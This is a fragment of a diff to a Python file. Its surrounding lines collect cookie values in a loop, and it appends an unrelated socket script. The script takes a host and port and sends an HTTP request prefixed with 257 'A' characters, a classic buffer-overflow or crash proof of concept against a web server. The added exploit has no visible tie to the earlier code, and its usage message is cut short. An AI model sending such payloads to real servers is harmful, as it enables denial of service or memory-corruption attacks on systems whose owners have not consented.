@@ -30,3 +30,35 @@ for i in range(1000):
     results.append(curr_cookie)
 
 print(results)
+
+
+
+
+import os
+import sys
+import socket
+
+def main(argv):
+    argc = len(argv)
+
+    if argc != 3:
+        print("usage: %s " % (argv[0]))
+        sys.exit(0)
+
+    host = argv[1]
+    port = int(argv[2])
+
+    print("[*] target: %s:%d" % (host, port))
+
+    payload = "A" * 257 + "/index.html HTTP/1.1\r\n\r\n"
+
+    print("[*] payload: %s" % (payload))
+
+    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sd.connect((host, port))
+    sd.send(payload)
+    sd.close()
+
+if __name__ == "__main__":
+    main(sys.argv)
+    sys.exit(0)
